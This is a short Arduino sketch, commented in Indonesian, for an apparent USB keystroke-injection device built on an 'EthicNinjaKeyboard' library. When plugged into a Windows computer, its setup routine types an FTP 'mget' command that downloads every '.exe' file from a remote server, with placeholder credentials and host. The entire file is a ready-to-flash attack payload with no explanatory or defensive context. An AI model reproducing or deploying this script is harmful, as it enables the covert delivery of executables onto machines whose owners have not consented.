#include <NinjaKeyboard.h>

EthicNinjaKeyboard en;

void setup()
{
  //Inisialisasi program
  en.init(1500);
  //Download 1 file atau lebih
  en.winFTP("mget","user_ftp","pass_ftp","host_ftp", "port_ftp","*.exe");
}

void loop() {
  
}

